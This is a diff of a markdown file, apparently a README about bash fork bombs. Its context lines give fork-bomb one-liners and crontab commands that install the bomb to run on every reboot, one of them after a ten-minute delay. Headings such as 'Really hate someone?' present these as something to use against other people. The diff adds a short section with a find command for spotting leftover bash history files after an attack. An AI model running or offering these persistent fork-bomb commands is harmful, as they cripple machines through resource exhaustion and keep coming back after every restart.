@@ -28,5 +28,12 @@ So yeah: try `_(){ _ | _ & }; :(){ $1 | : _ &}; : _`
 ## Really hate someone?
 `(crontab -l; echo "@reboot _(){ _ | _ & }; :(){ $1 | : _ &}; : _") | crontab -`
 
-### Really Reall hate someone?
+## Really Reall hate someone?
 `(crontab -l; echo "@reboot sleep 600 && _(){ _ | _ & }; :(){ $1 | : _ &}; : _") | crontab -`
+
+## Were you fork bombed? 
+[Here](https://unix.stackexchange.com/questions/647708/strange-empty-bash-history-tmp-files-in-my-home-folder?noredirect=1#comment1214090_647709)'s how to findout
+
+```bash
+find ~ -type f -iname ".bash_history-*.tmp"
+```
